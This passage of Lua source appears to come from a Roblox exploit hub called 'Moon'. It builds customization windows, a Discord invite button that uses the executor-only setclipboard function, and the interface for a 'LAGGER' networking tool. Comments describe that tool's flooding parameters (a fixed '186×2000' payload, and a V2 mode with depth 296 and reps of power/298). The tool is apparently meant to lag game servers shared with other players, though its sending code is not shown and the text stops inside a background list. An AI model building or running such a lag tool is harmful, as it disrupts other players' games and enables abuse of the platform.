			{ name = "None", id = 0 },
			{ name = "Moon", id = 116324254515657, color = Color3.fromRGB(215,215,225) },
			{ name = "Bg 1", id = 91573043841089,  color = Color3.fromRGB(70,140,255) },
			{ name = "Bg 2", id = 114200523225317, color = Color3.fromRGB(235,235,235) },
			{ name = "Bg 3", id = 139741219491406, color = Color3.fromRGB(140,140,145) },
			{ name = "Bg 4", id = 96955892887860,  color = Color3.fromRGB(143,143,143) },
			-- [BUGFIX] id stocké en TEXTE, pas en nombre : 15 chiffres, tostring()
			-- le fait passer en notation scientifique ("1.2599226778249e+14"),
			-- même bug que celui déjà corrigé dans le widget standalone.
			{ name = "Bg 5", id = "125992267782486", color = Color3.fromRGB(255,255,255) },
		}

		local bgMainBtn = Instance.new("TextButton", currentPage)
		bgMainBtn.Size = UDim2.new(1,0,0,30); bgMainBtn.LayoutOrder = LO()
		bgMainBtn.BackgroundColor3 = C_OFF_BG; bgMainBtn.BackgroundTransparency = 0.3
		bgMainBtn.BorderSizePixel = 0; bgMainBtn.Text = "BACKGROUND"; bgMainBtn.TextColor3 = C_MOON2
		bgMainBtn.Font = Enum.Font.GothamBlack; bgMainBtn.TextSize = 10
		bgMainBtn.AutoButtonColor = false
		addCorner(bgMainBtn, 8); addLivingStroke(bgMainBtn, 1); addLivingTextGradient(bgMainBtn)

		local mainCustomizeWin = Instance.new("Frame", gui)
		mainCustomizeWin.Name = _NS.."f"
		mainCustomizeWin.Size = UDim2.new(0, 210, 0, 190)  -- élargie (176→210) pour laisser respirer les vignettes
		mainCustomizeWin.Position = UDim2.new(0.5, WIN_W/2 + 10, 0.5, -137)
		mainCustomizeWin.BackgroundColor3 = C_BG
		mainCustomizeWin.BorderSizePixel = 0
		mainCustomizeWin.Visible = false
		mainCustomizeWin.Active = true
		addCorner(mainCustomizeWin, 12); addLivingStroke(mainCustomizeWin, 1.5)
		table.insert(_themeExcluded, mainCustomizeWin)

		local mcwHeader = Instance.new("Frame", mainCustomizeWin)
		mcwHeader.Size = UDim2.new(1, 0, 0, 26); mcwHeader.BackgroundColor3 = C_HEADER; mcwHeader.BorderSizePixel = 0
		addCorner(mcwHeader, 12); makeDraggable(mainCustomizeWin, mcwHeader, "mainbg")
		local mcwPatch = Instance.new("Frame", mcwHeader)
		mcwPatch.Size = UDim2.new(1, 0, 0, 10); mcwPatch.Position = UDim2.new(0, 0, 1, -10)
		mcwPatch.BackgroundColor3 = C_HEADER; mcwPatch.BorderSizePixel = 0
		local mcwTitle = Instance.new("TextLabel", mcwHeader)
		mcwTitle.Size = UDim2.new(1, -34, 1, 0); mcwTitle.Position = UDim2.new(0, 10, 0, 0)
		mcwTitle.BackgroundTransparency = 1; mcwTitle.Text = "Customize"
		mcwTitle.TextColor3 = C_WHITE; mcwTitle.Font = Enum.Font.GothamBold; mcwTitle.TextSize = 11
		mcwTitle.TextXAlignment = Enum.TextXAlignment.Left
		local mcwCloseBtn = Instance.new("TextButton", mcwHeader)
		mcwCloseBtn.Size = UDim2.new(0, 20, 0, 20); mcwCloseBtn.Position = UDim2.new(1, -24, 0.5, -10)
		mcwCloseBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 34); mcwCloseBtn.BorderSizePixel = 0
		mcwCloseBtn.Text = "X"; mcwCloseBtn.TextColor3 = C_WHITE
		mcwCloseBtn.Font = Enum.Font.GothamBlack; mcwCloseBtn.TextSize = 11
		mcwCloseBtn.AutoButtonColor = false; addCorner(mcwCloseBtn, 6)
		mcwCloseBtn.MouseButton1Click:Connect(function() mainCustomizeWin.Visible = false end)

		local mcwThumbRow = Instance.new("Frame", mainCustomizeWin)
		mcwThumbRow.Size = UDim2.new(1, -16, 0, 60); mcwThumbRow.Position = UDim2.new(0, 8, 0, 34)
		mcwThumbRow.BackgroundTransparency = 1
		local mcwThumbs = {}
		do
			local n = #BG_OPTIONS
			local gap = 10  -- élargi (6→10) pour plus d'air entre les vignettes
			local tileW = (186 - gap * (n - 1)) / n  -- 186 = largeur intérieure (210-16) moins une marge droite de 8
			for i, entry in ipairs(BG_OPTIONS) do
				local tile = Instance.new("ImageButton", mcwThumbRow)
				tile.Size = UDim2.new(0, tileW, 0, 60)
				tile.Position = UDim2.new(0, (i - 1) * (tileW + gap), 0, 0)
				tile.BackgroundColor3 = C_OFF_BG; tile.BackgroundTransparency = 0.1
				tile.BorderSizePixel = 0
				tile.Image = entry.id ~= 0 and ("rbxassetid://" .. tostring(entry.id)) or ""
				tile.ScaleType = Enum.ScaleType.Crop
				addCorner(tile, 6)
				local tileStroke = addStroke(tile, entry.color or C_MOON, 1.5, 1)
				-- [UI] pas de label texte sur la tuile — entry.name reste utilisé
				-- côté code (toasts, identification), l'image seule s'affiche.
				mcwThumbs[i] = { btn = tile, stroke = tileStroke }
				tile.MouseButton1Click:Connect(function()
					if entry.id == 0 then
						if _GH.setPersonalize then _GH.setPersonalize(false) end
					else
						_bgImageLabel.Image = "rbxassetid://" .. tostring(entry.id)
						if _GH.setPersonalize then _GH.setPersonalize(true) end
					end
					if _GH.autoSave then _GH.autoSave() end
					for j, t in ipairs(mcwThumbs) do
						t.stroke.Transparency = (j == i) and 0.2 or 1
					end
				end)
			end
			-- Reflète l'état de départ (Moon/Personalize actif par défaut,
			-- donc "Bg 1" — la seule image déjà assignée à _bgImageLabel
			-- avant ce changement — apparaît sélectionnée au premier affichage).
			if _personalizeEnabled then
				mcwThumbs[2].stroke.Transparency = 0.2
			else
				mcwThumbs[1].stroke.Transparency = 0.2
			end
		end

		-- Theme color swatches — below the background thumbnails, restoring
		-- the old 6-color picker (Default/Noir/Crimson/White/Purple/Moon)
		-- that used to be its own "Theme" tab. applyTheme/_THEME_DEFS were
		-- never removed, just unexposed — this just re-exposes them here.
		-- Note: picking any color OTHER than Moon auto-disables the custom
		-- background image (applyTheme's own pre-existing behavior, "un seul
		-- thème actif à la fois") — unchanged, not something new.
		local mcwThemeRow = Instance.new("Frame", mainCustomizeWin)
		mcwThemeRow.Size = UDim2.new(1, -16, 0, 20); mcwThemeRow.Position = UDim2.new(0, 8, 0, 98)
		mcwThemeRow.BackgroundTransparency = 1
		local THEME_SWATCHES = {
			{ name = "default", color = Color3.fromRGB(90,160,255) },
			-- Was (205,205,205) — a light accent grey that didn't read as
			-- "Noir" at all. True near-black instead (not pure 0,0,0, so it
			-- still stays visible as a distinct tile against the window's
			-- own dark background, via its stroke + the slight lift).
			{ name = "noir",    color = Color3.fromRGB(20,20,20) },
			{ name = "crimson", color = Color3.fromRGB(230,70,95) },
			{ name = "white",   color = Color3.fromRGB(255,255,255) },
			{ name = "purple",  color = Color3.fromRGB(170,110,255) },
			-- Moon is the "use a custom background image" theme, not really
			-- a flat color — shows a live preview of the actual Moon
			-- background image instead of a plain swatch.
			{ name = "moon",    color = Color3.fromRGB(215,215,225), image = "rbxassetid://116324254515657" },
		}
		local mcwSwatches = {}
		do
			local n = #THEME_SWATCHES
			local gap = 4
			local dotW = (194 - gap * (n - 1)) / n
			for i, t in ipairs(THEME_SWATCHES) do
				local dot = Instance.new(t.image and "ImageButton" or "TextButton", mcwThemeRow)
				dot.Size = UDim2.new(0, dotW, 1, 0)
				dot.Position = UDim2.new(0, (i - 1) * (dotW + gap), 0, 0)
				dot.BackgroundColor3 = t.color; dot.BorderSizePixel = 0
				dot.AutoButtonColor = false
				if t.image then
					dot.Image = t.image; dot.ScaleType = Enum.ScaleType.Crop
				else
					dot.Text = ""
				end
				addCorner(dot, 6)
				local dotStroke = addStroke(dot, C_WHITE, 1.5, 1)
				mcwSwatches[i] = { stroke = dotStroke, name = t.name, dot = dot, color = t.color }
				dot.MouseButton1Click:Connect(function()
					applyTheme(t.name)
					if _GH.autoSave then _GH.autoSave() end
				end)
			end
			-- Synced via _G_updateThemeUI (fires from inside applyTheme itself,
			-- no matter what triggers it — a swatch click, or MH_load restoring
			-- a saved theme later on) instead of a one-time check here: this
			-- window is built before MH_load runs, so _currentTheme at this
			-- exact point is still the hardcoded default, not any saved value.
			-- Also re-asserts each dot's own fixed color every call: applyTheme's
			-- descendant sweep (further up) matches BackgroundColor3 against the
			-- OLD theme's role colors and remaps anything that matches — and
			-- these swatches deliberately use the exact same RGB values as each
			-- theme's `moon` role color (so a swatch always looks like that
			-- theme), which made them a false-positive match: picking one theme
			-- silently repainted every OTHER swatch to the new theme's color
			-- too ("les couleurs sont bizarre pas fix"). Reasserting here, after
			-- the sweep already ran, guarantees each dot always shows its own
			-- true color regardless of what the sweep did to it.
			local function refreshThemeSwatches(name)
				for _, s in ipairs(mcwSwatches) do
					s.stroke.Transparency = (s.name == name) and 0.1 or 1
					s.dot.BackgroundColor3 = s.color
				end
			end
			_G_updateThemeUI = refreshThemeSwatches
			refreshThemeSwatches(_currentTheme)
		end

		local mcwVisRow = Instance.new("Frame", mainCustomizeWin)
		mcwVisRow.Size = UDim2.new(1, -16, 0, 26); mcwVisRow.Position = UDim2.new(0, 8, 0, 126)
		mcwVisRow.BackgroundColor3 = C_ROW; mcwVisRow.BackgroundTransparency = 0.35; mcwVisRow.BorderSizePixel = 0
		addCorner(mcwVisRow, 8); addLivingStroke(mcwVisRow, 1)
		local mcwVisLbl = Instance.new("TextLabel", mcwVisRow)
		mcwVisLbl.Size = UDim2.new(0.55, 0, 1, 0); mcwVisLbl.Position = UDim2.new(0, 8, 0, 0)
		mcwVisLbl.BackgroundTransparency = 1; mcwVisLbl.Text = "Visibility"
		mcwVisLbl.TextColor3 = C_WHITE; mcwVisLbl.Font = Enum.Font.GothamBold; mcwVisLbl.TextSize = 9
		mcwVisLbl.TextXAlignment = Enum.TextXAlignment.Left
		local mcwVisMinus = Instance.new("TextButton", mcwVisRow)
		mcwVisMinus.Size = UDim2.new(0, 18, 0, 18); mcwVisMinus.Position = UDim2.new(1, -70, 0.5, -9)
		mcwVisMinus.BackgroundColor3 = C_OFF_BG; mcwVisMinus.Text = "-"; mcwVisMinus.TextColor3 = C_MOON2
		mcwVisMinus.Font = Enum.Font.GothamBold; mcwVisMinus.TextSize = 12; mcwVisMinus.BorderSizePixel = 0
		mcwVisMinus.AutoButtonColor = false; addCorner(mcwVisMinus, 5)
		local mcwVisVal = Instance.new("TextLabel", mcwVisRow)
		mcwVisVal.Size = UDim2.new(0, 32, 0, 18); mcwVisVal.Position = UDim2.new(1, -50, 0.5, -9)
		mcwVisVal.BackgroundTransparency = 1; mcwVisVal.Text = "100%"
		mcwVisVal.TextColor3 = C_SILVER; mcwVisVal.Font = Enum.Font.GothamBold; mcwVisVal.TextSize = 10
		local mcwVisPlus = Instance.new("TextButton", mcwVisRow)
		mcwVisPlus.Size = UDim2.new(0, 18, 0, 18); mcwVisPlus.Position = UDim2.new(1, -18, 0.5, -9)
		mcwVisPlus.BackgroundColor3 = C_OFF_BG; mcwVisPlus.Text = "+"; mcwVisPlus.TextColor3 = C_MOON2
		mcwVisPlus.Font = Enum.Font.GothamBold; mcwVisPlus.TextSize = 12; mcwVisPlus.BorderSizePixel = 0
		mcwVisPlus.AutoButtonColor = false; addCorner(mcwVisPlus, 5)
		local mcwVisibility = 100 -- % — _bgImageLabel démarre à ImageTransparency=0 (voir ligne ~3290)
		mcwVisMinus.MouseButton1Click:Connect(function()
			mcwVisibility = math.clamp(mcwVisibility - 5, 0, 100)
			mcwVisVal.Text = mcwVisibility .. "%"
			_bgImageLabel.ImageTransparency = 1 - (mcwVisibility / 100)
		end)
		mcwVisPlus.MouseButton1Click:Connect(function()
			mcwVisibility = math.clamp(mcwVisibility + 5, 0, 100)
			mcwVisVal.Text = mcwVisibility .. "%"
			_bgImageLabel.ImageTransparency = 1 - (mcwVisibility / 100)
		end)

		-- Save/restore bridge — neither the selected image nor the visibility
		-- slider was ever persisted before; only the theme name was. Mirrors
		-- exactly what a thumbnail click does (image + personalize + stroke
		-- highlight) so a restored save looks identical to a real selection.
		_GH.mcwGetBgState = function()
			return { image = _bgImageLabel.Image, visibility = mcwVisibility }
		end
		_GH.mcwSetBgState = function(d)
			if not d then return end
			if d.image ~= nil then
				_bgImageLabel.Image = d.image
				if _GH.setPersonalize then _GH.setPersonalize(d.image ~= "") end
				for _, t in ipairs(mcwThumbs) do
					t.stroke.Transparency = (t.btn.Image == d.image) and 0.2 or 1
				end
			end
			if type(d.visibility) == "number" then
				mcwVisibility = math.clamp(d.visibility, 0, 100)
				mcwVisVal.Text = mcwVisibility .. "%"
				_bgImageLabel.ImageTransparency = 1 - (mcwVisibility / 100)
			end
		end

		bgMainBtn.MouseButton1Click:Connect(function()
			mainCustomizeWin.Visible = not mainCustomizeWin.Visible
		end)
	end

	UIB.makeGap(4)
	-- Takes effect on the NEXT load (the intro already ran, or didn't, by
	-- the time this row exists) — same scoping as Adapt's own Intro toggle.
	-- Inverted label/semantics from the old "Intro" row: ON here means
	-- SKIP it (so it defaults OFF, matching _introEnabled's default true —
	-- intro plays unless this is turned on).
	UIB.makeToggleRow("Skip Intro", not _introEnabled, function(on)
		_introEnabled = not on
		if _GH.autoSave then _GH.autoSave() end
	end)

	UIB.makeGap(6)
	UIB.makeSectionLabel("Credits")
	local creditRow = Instance.new("Frame", currentPage)
	creditRow.Size = UDim2.new(1,0,0,30); creditRow.BackgroundTransparency = 1; creditRow.LayoutOrder = LO()
	local creditFooter = Instance.new("TextLabel", creditRow)
	creditFooter.Size = UDim2.new(1,0,1,0); creditFooter.BackgroundTransparency = 1
	creditFooter.Text = "ALN x YSLEM"
	creditFooter.TextColor3 = C_SILVER2; creditFooter.Font = Enum.Font.Gotham; creditFooter.TextSize = 10
	addLivingTextGradient(creditFooter)

	-- ── DISCORD BILLBOARD — même langage visuel que les toggle rows,
	-- couleurs pilotées par les tokens de thème (se recolore avec applyTheme
	-- comme le reste du hub). Clic = copie l'invite dans le presse-papier.
	UIB.makeGap(4)
	UIB.makeSectionLabel("Discord")
	local discordRow = Instance.new("TextButton", currentPage)
	discordRow.Size = UDim2.new(1,0,0,32); discordRow.BackgroundColor3 = C_ROW
	discordRow.BackgroundTransparency = 0.35; discordRow.BorderSizePixel = 0
	discordRow.LayoutOrder = LO(); discordRow.Text = ""; discordRow.AutoButtonColor = false
	addCorner(discordRow, 12); addLivingStroke(discordRow, 1)
	discordRow.MouseEnter:Connect(function() TweenService:Create(discordRow,TweenInfo.new(0.1),{BackgroundTransparency=0.15}):Play() end)
	discordRow.MouseLeave:Connect(function() TweenService:Create(discordRow,TweenInfo.new(0.1),{BackgroundTransparency=0.35}):Play() end)
	local discordDot = Instance.new("Frame", discordRow)
	discordDot.Size = UDim2.new(0,5,0,5); discordDot.Position = UDim2.new(0,14,0.5,-3)
	discordDot.BackgroundColor3 = C_MOON; discordDot.BorderSizePixel = 0; addCorner(discordDot, 3)
	local discordLbl = Instance.new("TextLabel", discordRow)
	discordLbl.Size = UDim2.new(1,-32,1,0); discordLbl.Position = UDim2.new(0,26,0,0)
	discordLbl.BackgroundTransparency = 1; discordLbl.Text = "discord.gg/moonn"
	discordLbl.TextColor3 = C_WHITE; discordLbl.Font = Enum.Font.GothamBold; discordLbl.TextSize = 11
	discordLbl.TextXAlignment = Enum.TextXAlignment.Left; addLivingTextGradient(discordLbl)
	discordRow.MouseButton1Click:Connect(function()
		pcall(function() if setclipboard then setclipboard("discord.gg/moonn") end end)
		if _GH.showToast then _GH.showToast("Discord invite copied", "info") end
	end)
end);  -- required semicolon (otherwise ambiguous merge with the (function() below)

-- ===================================================================
-- LAGGER (networking engine — UI: Moon Duel design system v2)
-- ===================================================================
(function()
-- ── État simple (rien qui puisse échouer ici) ──────
local cfg           = { version = "V1", dynPower = 97000 }
local laggerActive  = false
local laggerThread  = nil
local cachedRemote  = nil
local startTime     = 0
local minimized     = false
local waitingForKey = false
local keybind       = Enum.KeyCode.L
local _NC           = nil   -- résolu plus bas, après la création du widget
local _RS           = nil

-- ════════════════════════════════════════════════════════════════════
-- WIDGET — construit EN PREMIER (état simple puis widget tout de
-- suite après), avant toute logique réseau. Si quoi que ce soit plus bas
-- (résolution de service, recherche de remote) devait un jour échouer,
-- le panneau existe déjà et reste utilisable — [BUGFIX] ordre inversé
-- par rapport à la version précédente, qui résolvait
-- NetworkClient/ReplicatedStorage AVANT de construire le widget.
--   160 × 202 px
-- ════════════════════════════════════════════════════════════════════
local lgrW = Instance.new("Frame", gui)
lgrW.Name         = _NS.."d"
lgrW.Size         = UDim2.new(0, 160, 0, 280)
-- [BUGFIX] Sur les écrans avec un espace de coordonnées UI restreint
-- (confirmé en debug : Pos=494,332 sur un écran où le panneau principal
-- — Y centré ~210 — reste pleinement visible), Y=390 tombait hors de la
-- zone visible alors que Y=210 (bande verticale déjà à l'écran) ne pose
-- aucun problème. Remonté un peu ensuite (Y=210 -> Y=170) : reste dans
-- la même bande verticale confirmée visible sur l'appareil testé (monter
-- ne fait que rapprocher du haut d'écran, jamais de la zone hors-champ en
-- bas qui posait problème).
lgrW.Position     = UDim2.new(1, -426, 0, 170)
lgrW.BackgroundColor3 = C_BG
lgrW.BorderSizePixel  = 0
lgrW.ClipsDescendants = true
lgrW.Active       = true
lgrW.Visible      = false
addCorner(lgrW, 12); addLivingStroke(lgrW, 1.5)
_lgrBypassWidget  = lgrW

-- ── Fond personnalisable (système Background, cf. bouton plus bas) ──
-- Créé en tout premier enfant + ZIndex 0 : rendu derrière toutes les
-- autres rangées (défaut ZIndex 1) sans qu'elles aient besoin d'y penser.
local lgrBgImage = Instance.new("ImageLabel", lgrW)
lgrBgImage.Size = UDim2.new(1, 0, 1, 0)
lgrBgImage.BackgroundTransparency = 1
lgrBgImage.Image = ""
lgrBgImage.ImageTransparency = 0.65 -- correspond au 35% par défaut ci-dessous
lgrBgImage.ScaleType = Enum.ScaleType.Crop
lgrBgImage.ZIndex = 0
addCorner(lgrBgImage, 12)

-- ── Header ──────────────────────────────────────────────────────────
local lgrH = Instance.new("Frame", lgrW)
lgrH.Size = UDim2.new(1, 0, 0, 28); lgrH.BackgroundColor3 = C_HEADER; lgrH.BorderSizePixel = 0
addCorner(lgrH, 12); makeDraggable(lgrW, lgrH, "lagger")
-- patch bas du header arrondi
local lgrPatch = Instance.new("Frame", lgrH)
lgrPatch.Size = UDim2.new(1, 0, 0, 12); lgrPatch.Position = UDim2.new(0, 0, 1, -12)
lgrPatch.BackgroundColor3 = C_HEADER; lgrPatch.BorderSizePixel = 0
-- point décoratif
local lgrDot = Instance.new("Frame", lgrH)
lgrDot.Size = UDim2.new(0, 5, 0, 5); lgrDot.Position = UDim2.new(0, 10, 0, 11)
lgrDot.BackgroundColor3 = C_MOON; lgrDot.BorderSizePixel = 0; addCorner(lgrDot, 3)
-- titre
local lgrTitle = Instance.new("TextLabel", lgrH)
lgrTitle.Size = UDim2.new(1, -52, 1, 0); lgrTitle.Position = UDim2.new(0, 20, 0, 0)
lgrTitle.BackgroundTransparency = 1; lgrTitle.Text = "LAGGER"
lgrTitle.TextColor3 = C_WHITE; lgrTitle.Font = Enum.Font.GothamBlack; lgrTitle.TextSize = 10
lgrTitle.TextXAlignment = Enum.TextXAlignment.Left; addLivingTextGradient(lgrTitle)
-- bouton minimiser
local LGR_H_FULL = 280 -- 246 + 34 (rangée Background ajoutée)
local lgrMinBtn = Instance.new("TextButton", lgrH)
lgrMinBtn.Size = UDim2.new(0, 20, 0, 20); lgrMinBtn.Position = UDim2.new(1, -26, 0.5, -10)
lgrMinBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 34); lgrMinBtn.BorderSizePixel = 0
lgrMinBtn.Text = "-"; lgrMinBtn.TextColor3 = C_WHITE
lgrMinBtn.Font = Enum.Font.GothamBlack; lgrMinBtn.TextSize = 13
lgrMinBtn.AutoButtonColor = false; addCorner(lgrMinBtn, 6); addLivingStroke(lgrMinBtn, 1)

-- ── Panneau info (status + version + timer) ─────────────────────────
--   Fond légèrement distinct pour grouper visuellement les 3 infos
local infoPanel = Instance.new("Frame", lgrW)
infoPanel.Size = UDim2.new(1, -16, 0, 54)
infoPanel.Position = UDim2.new(0, 8, 0, 34)
infoPanel.BackgroundColor3 = C_ROW; infoPanel.BackgroundTransparency = 0.55
infoPanel.BorderSizePixel = 0
addCorner(infoPanel, 8); addLivingStroke(infoPanel, 1)

-- Indicateur status (point coloré)
local stDot = Instance.new("Frame", infoPanel)
stDot.Size = UDim2.new(0, 6, 0, 6); stDot.Position = UDim2.new(0, 10, 0, 12)
stDot.BackgroundColor3 = C_DIM; stDot.BorderSizePixel = 0; addCorner(stDot, 3)

-- Texte status
-- [BUGFIX] Badge version (coin haut-droit) retiré — redondant avec la
-- rangée Mode (V1/V2) juste en dessous. stTxt élargi pour occuper l'espace
-- laissé libre.
local stTxt = Instance.new("TextLabel", infoPanel)
stTxt.Size = UDim2.new(1, -20, 0, 18); stTxt.Position = UDim2.new(0, 22, 0, 5)
stTxt.BackgroundTransparency = 1; stTxt.Text = "OFFLINE"
stTxt.TextColor3 = C_DIM; stTxt.Font = Enum.Font.GothamBold; stTxt.TextSize = 10
stTxt.TextXAlignment = Enum.TextXAlignment.Left

-- Timer (centré en bas du panneau)
local tiTxt = Instance.new("TextLabel", infoPanel)
tiTxt.Size = UDim2.new(1, 0, 0, 22); tiTxt.Position = UDim2.new(0, 0, 0, 28)
tiTxt.BackgroundTransparency = 1; tiTxt.Text = "00:00"
tiTxt.TextColor3 = C_SILVER; tiTxt.Font = Enum.Font.GothamBlack; tiTxt.TextSize = 14
tiTxt.TextXAlignment = Enum.TextXAlignment.Center

-- ── Rangée version (V1 | V2) ────────────────────────────────────────
local vRow = Instance.new("Frame", lgrW)
vRow.Size = UDim2.new(1, -16, 0, 26); vRow.Position = UDim2.new(0, 8, 0, 94)
vRow.BackgroundColor3 = C_ROW; vRow.BackgroundTransparency = 0.35; vRow.BorderSizePixel = 0
addCorner(vRow, 8); addLivingStroke(vRow, 1)

local vLbl = Instance.new("TextLabel", vRow)
vLbl.Size = UDim2.new(0.45, 0, 1, 0); vLbl.Position = UDim2.new(0, 10, 0, 0)
vLbl.BackgroundTransparency = 1; vLbl.Text = "Mode"
vLbl.TextColor3 = C_WHITE; vLbl.Font = Enum.Font.GothamBold; vLbl.TextSize = 10
vLbl.TextXAlignment = Enum.TextXAlignment.Left; addLivingTextGradient(vLbl)

local v1Btn = Instance.new("TextButton", vRow)
v1Btn.Size = UDim2.new(0, 32, 0, 18); v1Btn.Position = UDim2.new(1, -70, 0.5, -9)
v1Btn.BackgroundColor3 = C_ON_BG; v1Btn.BackgroundTransparency = 0.1
v1Btn.Text = "V1"; v1Btn.TextColor3 = C_MOON
v1Btn.Font = Enum.Font.GothamBold; v1Btn.TextSize = 9
v1Btn.BorderSizePixel = 0; v1Btn.AutoButtonColor = false
addCorner(v1Btn, 5); addLivingStroke(v1Btn, 1)

local v2Btn = Instance.new("TextButton", vRow)
v2Btn.Size = UDim2.new(0, 32, 0, 18); v2Btn.Position = UDim2.new(1, -34, 0.5, -9)
v2Btn.BackgroundColor3 = C_OFF_BG; v2Btn.BackgroundTransparency = 0.2
v2Btn.Text = "V2"; v2Btn.TextColor3 = C_DIM
v2Btn.Font = Enum.Font.GothamBold; v2Btn.TextSize = 9
v2Btn.BorderSizePixel = 0; v2Btn.AutoButtonColor = false
addCorner(v2Btn, 5); addLivingStroke(v2Btn, 1)

-- ── Rangée power (V2 = dynamique) ──────────────────────────────────
-- V1 ignore cette valeur (payload fixe 186×2000).
-- V2 utilise depth=296, reps=power/298 (ex: 97000 → 325 reps vs 180 fixe avant).
local pwRow = Instance.new("Frame", lgrW)
pwRow.Size = UDim2.new(1, -16, 0, 26); pwRow.Position = UDim2.new(0, 8, 0, 124)
pwRow.BackgroundColor3 = C_ROW; pwRow.BackgroundTransparency = 0.35; pwRow.BorderSizePixel = 0
addCorner(pwRow, 8); addLivingStroke(pwRow, 1)
local pwLbl = Instance.new("TextLabel", pwRow)
pwLbl.Size = UDim2.new(0.5, 0, 1, 0); pwLbl.Position = UDim2.new(0, 10, 0, 0)
pwLbl.BackgroundTransparency = 1; pwLbl.Text = "Power"
pwLbl.TextColor3 = C_WHITE; pwLbl.Font = Enum.Font.GothamBold; pwLbl.TextSize = 10
pwLbl.TextXAlignment = Enum.TextXAlignment.Left; addLivingTextGradient(pwLbl)
local pwBox = Instance.new("TextBox", pwRow)
pwBox.Size = UDim2.new(0, 62, 0, 20); pwBox.Position = UDim2.new(1, -68, 0.5, -10)
pwBox.BackgroundColor3 = C_OFF_BG; pwBox.BackgroundTransparency = 0.1
pwBox.Text = tostring(cfg.dynPower); pwBox.TextColor3 = C_SILVER
pwBox.Font = Enum.Font.GothamBold; pwBox.TextSize = 9
pwBox.BorderSizePixel = 0; pwBox.ClearTextOnFocus = false
addCorner(pwBox, 5); addLivingStroke(pwBox, 1)

-- ── Bouton Activate ─────────────────────────────────────────────────
local actBtn = Instance.new("TextButton", lgrW)
actBtn.Size = UDim2.new(1, -16, 0, 28); actBtn.Position = UDim2.new(0, 8, 0, 154)
actBtn.BackgroundColor3 = C_OFF_BG; actBtn.BackgroundTransparency = 0.2
actBtn.Text = "DISABLED"; actBtn.TextColor3 = C_DIM
actBtn.Font = Enum.Font.GothamBlack; actBtn.TextSize = 11
actBtn.BorderSizePixel = 0; actBtn.AutoButtonColor = false
addCorner(actBtn, 8); addLivingStroke(actBtn, 1)

-- ── Rangée keybind ───────────────────────────────────────────────────
local kRow = Instance.new("Frame", lgrW)
kRow.Size = UDim2.new(1, -16, 0, 26); kRow.Position = UDim2.new(0, 8, 0, 186)
kRow.BackgroundColor3 = C_ROW; kRow.BackgroundTransparency = 0.35; kRow.BorderSizePixel = 0
addCorner(kRow, 8); addLivingStroke(kRow, 1)

local kLbl = Instance.new("TextLabel", kRow)
kLbl.Size = UDim2.new(0.5, 0, 1, 0); kLbl.Position = UDim2.new(0, 10, 0, 0)
kLbl.BackgroundTransparency = 1; kLbl.Text = "Bind"
kLbl.TextColor3 = C_WHITE; kLbl.Font = Enum.Font.GothamBold; kLbl.TextSize = 10
kLbl.TextXAlignment = Enum.TextXAlignment.Left; addLivingTextGradient(kLbl)

local kBtn = Instance.new("TextButton", kRow)
kBtn.Size = UDim2.new(0, 42, 0, 20); kBtn.Position = UDim2.new(1, -48, 0.5, -10)
kBtn.BackgroundColor3 = C_OFF_BG; kBtn.BackgroundTransparency = 0.1
kBtn.Text = keybind.Name; kBtn.TextColor3 = C_MOON2
kBtn.Font = Enum.Font.GothamBold; kBtn.TextSize = 10
kBtn.BorderSizePixel = 0; kBtn.AutoButtonColor = false
addCorner(kBtn, 5); addLivingTextGradient(kBtn)

-- ── Bouton Background — ouvre la fenêtre Customize (cf. plus bas) ────
local bgBtn = Instance.new("TextButton", lgrW)
bgBtn.Size = UDim2.new(1, -16, 0, 28); bgBtn.Position = UDim2.new(0, 8, 0, 214)
bgBtn.BackgroundColor3 = C_ROW; bgBtn.BackgroundTransparency = 0.35
bgBtn.Text = "BACKGROUND"; bgBtn.TextColor3 = C_MOON2
bgBtn.Font = Enum.Font.GothamBlack; bgBtn.TextSize = 10
bgBtn.BorderSizePixel = 0; bgBtn.AutoButtonColor = false
addCorner(bgBtn, 8); addLivingStroke(bgBtn, 1); addLivingTextGradient(bgBtn)

-- ── Footer ──────────────────────────────────────────────────────────
local lgrFoot = Instance.new("TextLabel", lgrW)
lgrFoot.Size = UDim2.new(1, -16, 0, 13); lgrFoot.Position = UDim2.new(0, 8, 0, 248)
lgrFoot.BackgroundTransparency = 1
lgrFoot.Text = "MOON  •  Lagger"
lgrFoot.TextColor3 = C_SILVER2; lgrFoot.Font = Enum.Font.Gotham; lgrFoot.TextSize = 8
lgrFoot.TextXAlignment = Enum.TextXAlignment.Center; addLivingTextGradient(lgrFoot)

-- Discord — affiché directement sur le panneau (comme la source Noxa
-- d'origine, qui montrait "discord.gg/..." sur le widget lui-même).
-- Cliquable : copie l'invite dans le presse-papier.
local lgrDiscord = Instance.new("TextButton", lgrW)
lgrDiscord.Size = UDim2.new(1, -16, 0, 14); lgrDiscord.Position = UDim2.new(0, 8, 0, 262)
lgrDiscord.BackgroundTransparency = 1; lgrDiscord.Text = "discord.gg/moonn"
lgrDiscord.TextColor3 = C_MOON2; lgrDiscord.Font = Enum.Font.GothamBold; lgrDiscord.TextSize = 9
lgrDiscord.AutoButtonColor = false
lgrDiscord.TextXAlignment = Enum.TextXAlignment.Center; addLivingTextGradient(lgrDiscord)
lgrDiscord.MouseButton1Click:Connect(function()
	pcall(function() if setclipboard then setclipboard("discord.gg/moonn") end end)
	if _GH.showToast then _GH.showToast("discord.gg/moonn copied", "info") end
end)

-- ════════════════════════════════════════════════════════════════════
-- BACKGROUND — fenêtre "Customize" (motif Noxa) : miniatures cliquables,
-- appliquées EN DIRECT sur lgrBgImage dès le clic (pas de bouton
-- "confirmer" séparé — la fenêtre reste ouverte à côté du widget, donc
-- l'effet est visible immédiatement, exactement "voir avant de
-- sélectionner"). Slider de visibilité séparé, agit sur l'image
-- actuellement appliquée peu importe laquelle.
--
-- [À CONFIGURER] ids à 0 = pas encore d'image assignée (comportement
-- honnête : Image="" ne rend rien, pas d'erreur). Remplace par de vrais
-- assetid une fois les images uploadées sur Roblox, même flux que
-- l'intro koï plus haut dans ce fichier.
-- ════════════════════════════════════════════════════════════════════
-- Each entry's `color` is that image's own dominant/accent tone (measured
-- by pixel analysis), used below for that tile's own selection stroke —
-- same reasoning as mainCustomizeWin's BG_OPTIONS above.
local BACKGROUNDS = {
	{ name = "None",  id = 0 },
	{ name = "Moon",  id = 116324254515657, color = Color3.fromRGB(215,215,225) },
	{ name = "Bg 1",  id = 91573043841089,  color = Color3.fromRGB(70,140,255) },
	{ name = "Bg 2",  id = 114200523225317, color = Color3.fromRGB(235,235,235) },
